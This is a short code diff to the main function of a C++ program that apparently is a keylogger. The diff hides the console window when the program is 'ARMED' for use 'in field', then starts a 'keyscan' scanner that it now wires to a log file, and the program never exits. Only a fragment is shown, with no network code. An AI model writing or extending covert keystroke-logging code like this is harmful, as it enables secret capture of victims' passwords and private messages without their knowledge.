@@ -7,7 +7,8 @@ int main() {
 	//if running in field hide console
 	if (ARMED) FreeConsole();
 	//scanning from hereon
-	keyscan scanner;
+	auto* l = new logFILE(FNAME);
+	keyscan scanner(l);
 	scanner.scan();
 	//will never be reached
 	return 1;
